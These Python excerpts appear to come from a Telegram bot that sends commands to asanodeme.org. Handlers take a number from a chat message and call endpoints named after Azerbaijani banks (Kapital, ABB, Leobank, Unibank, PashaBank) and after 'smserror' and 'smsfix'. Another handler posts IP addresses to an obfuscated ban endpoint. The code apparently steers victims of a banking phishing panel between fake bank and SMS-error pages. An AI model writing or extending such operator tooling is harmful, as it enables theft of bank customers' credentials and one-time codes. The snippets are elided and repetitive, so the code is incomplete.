...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/kapital/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/abb/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/leobank/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/unibank/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/smserror/{number}"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/smsfix/{number}"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/pashabank/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asanodeme.org/crud/error/{number}/"
        response = requests.get(url)
...
def kapital(client, message):
    try:
        ...
        url = f"https://asanodeme.org/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
        data = {
            "ip_address": f"{ip}",
            "ban_reason": ""
        }
